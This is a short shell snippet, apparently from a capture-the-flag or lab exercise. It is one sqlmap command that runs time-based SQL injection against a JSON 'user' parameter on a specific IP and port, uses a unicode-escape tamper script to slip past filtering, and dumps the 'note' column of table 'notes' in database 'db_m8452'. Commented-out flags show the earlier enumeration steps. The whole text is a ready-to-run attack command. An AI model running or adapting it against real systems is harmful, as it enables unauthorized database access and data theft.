sqlmap --tamper=charunicodeescape\
    -u http://206.189.121.131:30901\
    --data='{"user": "*"}'\
    --level=3\
    --risk=1\
    -v 6\
    --dbms='MySQL'\
    -D 'db_m8452'\
    -T 'notes'\
    -C 'note'\
    --all\
    --test-filter="query SLEEP"\
    --output-dir=$PWD/sqlmap
# --current-db\
# --tables\
# --exclude-sysdbs\
